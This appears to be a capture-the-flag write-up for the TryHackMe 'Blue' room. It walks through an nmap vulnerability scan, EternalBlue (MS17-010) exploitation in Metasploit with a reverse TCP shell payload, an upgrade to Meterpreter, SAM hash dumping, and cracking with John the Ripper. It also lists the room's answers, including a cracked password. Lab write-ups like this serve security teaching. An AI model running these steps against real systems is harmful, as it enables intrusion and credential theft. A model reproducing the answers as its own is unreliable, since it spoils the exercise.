 # TryHackme: Blue



## [Task 1] Recon

For the first task you should first use nmap to scan for open ports and find the type of the machines vulnerability.By running the command `nmap -sV --script=vuln -p0-1000 -open -vv 10.10.72.41` you will  find the number of open ports with port number under 1000 and the vulnerability of the machine.

<img width="415" alt="1" src="https://user-images.githubusercontent.com/28839345/164227293-7168486b-11c6-4d41-be7b-a9451185db5b.png">

<img width="924" alt="2" src="https://user-images.githubusercontent.com/28839345/164227304-1e9460d6-09e9-4ce9-a653-b46fd0164e3b.png">

#### Questions
**1. How many ports are open with a port number under 1000?**

3

**2. How many ports are open with a port number under 1000?**

ms17-010


## [Task 2] Gain Access

For this task you should first open metasploit by running the command "msfconsole" and search for the exploitation needed.Since you have the cve from the nmap results(CVE-2017-0143) run the command `search cve:cve-2017-0143` to search for possible exploitations that can be used.
<img width="1196" alt="3" src="https://user-images.githubusercontent.com/28839345/164227314-a1e798cb-6c3b-4081-990a-1167d168e770.png">

 As you can see from the above photo the full path of this exploit is "exploit/windows/smb/ms17_010_eternalblue". 

To use the exploit run the command `use exploit/windows/smb/ms17_010_eternalblue` command and then run "show options" to check the available options for this module
<img width="707" alt="4" src="https://user-images.githubusercontent.com/28839345/164227319-60ab875a-158b-46e3-9ece-84e411c9aa16.png">

Bellow you can see the output of the show options command that refers to the module options.
<img width="1152" alt="5" src="https://user-images.githubusercontent.com/28839345/164227331-d0f3ece8-9e7e-44ec-af88-a492927919d8.png">

You should then set RHOSTS to the remote host ip address.

<img width="668" alt="6" src="https://user-images.githubusercontent.com/28839345/164227336-c33e8f6f-3c7d-4465-bd38-dc0b24f02cbd.png">


After setting the RHOSTS you should set the payload of this module by running the command `set payload windows/x64/shell/reverse_tcp`

To confirm that the exploit runs correctly enter the `exploit` command and press enter .

Bellow you can see the output after running the exploit in the target machine

<img width="1128" alt="7" src="https://user-images.githubusercontent.com/28839345/164227356-9245e80d-66c5-4d9e-8fb8-d45b96b5645a.png">

#### Questions
**1. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**

exploit/windows/smb/ms17_010_eternalblue

**2. Show options and set the one required value. What is the name of this value? (All caps for submission)**

RHOSTS


## [Task 3] Escalate

Most of the time after exploiting a machine you land into a command shell. In this case, you want to upgrade your shell to Meterpreter Shell.

The steps required to upgrade your shell to a Meterpreter shell are the following

Step 1. Background the current session by pressing CTRL + Z
<img width="485" alt="8" src="https://user-images.githubusercontent.com/28839345/164227367-ec73a91f-06f9-4031-9ae4-1287dc3c3b7c.png">

Step 2. Run the command `search shell_to_meterpreter`
<img width="967" alt="9" src="https://user-images.githubusercontent.com/28839345/164227389-045c833f-534a-44d9-b8e3-a7392f89380b.png">


Step 3. Check the session by using the command `session -l`.

<img width="1407" alt="10" src="https://user-images.githubusercontent.com/28839345/164227415-395c66fd-ef3c-496e-be2a-1e4fe7d26bf3.png">


Step 4. Configure the correct session.To do this first run the command `show options` to check the options and then set the SESSION to 1 as shown below.


<img width="1137" alt="11" src="https://user-images.githubusercontent.com/28839345/164227419-5db458f0-81af-46e0-8b44-2de7247f1c73.png">


Step 5. In the final step run the session by typing the command `run` and you will get the following output
<img width="518" alt="12" src="https://user-images.githubusercontent.com/28839345/164227421-37751e28-0374-4928-bbf6-dbb3912081d6.png">

Step 6. Funally run and use the new session by typing `session -l 2`

<img width="572" alt="13" src="https://user-images.githubusercontent.com/28839345/164227422-d4829b3f-0e55-418f-9e01-5441c9d013fa.png">

As you can see by following the previous steps you will upgrade the meterpreter shell successfully


<img width="552" alt="14" src="https://user-images.githubusercontent.com/28839345/164227423-1dcfb5f1-5e74-4122-87b2-aac0f522b7b6.png">



You can verify that you have escalated to NT AUTHORITY\SYSTEM by running getsystem and after this opening DOS SHELL by using the `shell` command and typing `whoami`.
<img width="683" alt="15" src="https://user-images.githubusercontent.com/28839345/164227424-883ca632-b330-4153-a44f-bec6b9e9e7cf.png">

After running the ps command you can see all the processes running.To migrate to a process that is running at NT AUTHORITY\SYSTEM you can  migrate to any of the proccesses running under C:\Windows\System32\ path because this kind of processes usually have the most permissions.
<img width="355" alt="16" src="https://user-images.githubusercontent.com/28839345/164227428-5f70d8a2-3c92-4e5a-9866-eb1ee62e1949.png">

#### Questions
**1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**

post/multi/manage/shell_to_meterpreter

**2. Select this (use MODULE_PATH). Show options, what option are we required to change?**

SESSION

### [Task 4] Cracking

In this task run the `hashdump` command so you can dump all of the hashes.

<img width="804" alt="17" src="https://user-images.githubusercontent.com/28839345/164227430-25ff9bc4-90b6-4d3e-87df-b077b3dc49ac.png">


After getting the hashes copy them to a  file in your local machine and use john the ripper to crack them.The command I used to crack them was the following 

 `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt" hashes.txt`


<img width="868" alt="18" src="https://user-images.githubusercontent.com/28839345/164227433-16aed49c-d8f6-456a-b52a-e58c2f6041f5.png">

#### Questions
**1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**

jon

**2. Copy this password hash to a file and research how to crack it. What is the cracked password?**

alqfna22



#### [Task 5] Find flags!

To find the flags use the command "search -f "flag*.txt" and then go to the directorys that you will see in the output.This directories will contain the flags needed to complete this task

<img width="515" alt="19" src="https://user-images.githubusercontent.com/28839345/164227437-95d4a50b-ed2b-4b74-b793-11cda3eacac8.png">




